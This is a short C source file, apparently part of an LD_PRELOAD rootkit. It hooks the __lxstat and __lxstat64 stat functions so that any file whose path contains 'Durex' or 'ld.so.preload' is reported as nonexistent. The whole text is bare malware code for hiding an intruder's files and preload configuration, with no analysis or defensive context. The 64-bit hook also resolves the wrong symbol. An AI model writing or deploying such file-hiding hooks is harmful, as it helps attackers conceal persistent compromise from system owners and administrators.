#define _GNU_SOURCE
#include <stdio.h>
#include <dlfcn.h>
#include <sys/stat.h>
#include <errno.h>
#include <string.h>
static const char*filter[]={"Durex","ld.so.preload",0};
#define DECLARE_LXSTAT(lxstat,stat)static int(*original_##lxstat)(int,const char*,struct stat*)=0;int lxstat(int v,const char*p,struct stat*b){if(original_##lxstat==NULL){original_##lxstat=dlsym(RTLD_NEXT,"__lxstat");if(original_##lxstat==NULL){return -1;}}int i=0;while(filter[i]){if(strstr(p,filter[i])){errno=ENOENT;return -1;}i++;}return original_##lxstat(v,p,b);}
DECLARE_LXSTAT(__lxstat64, stat64);
DECLARE_LXSTAT(__lxstat, stat);
